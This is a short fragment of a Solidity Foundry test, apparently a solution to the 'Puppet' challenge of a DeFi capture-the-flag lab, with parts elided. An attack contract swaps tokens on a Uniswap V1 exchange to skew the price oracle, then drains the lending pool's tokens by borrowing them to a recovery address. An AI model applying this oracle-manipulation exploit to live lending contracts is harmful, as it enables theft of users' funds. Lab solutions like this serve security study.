...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
        AttackContract exp = new AttackContract(token, lendingPool, uniswapV1Exchange, recovery);
        token.transfer(address(exp), 1000 ether);
        payable(address(exp)).transfer(20 ether);
        exp.exploit();
    }
...
contract AttackContract {
    ...
    function exploit() external {
        ...
        uniswapV1Exchange.tokenToEthSwapOutput(9.9 ether, type(uint256).max, block.timestamp + 64);

        lendingPool.borrow{value: 20 ether}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }
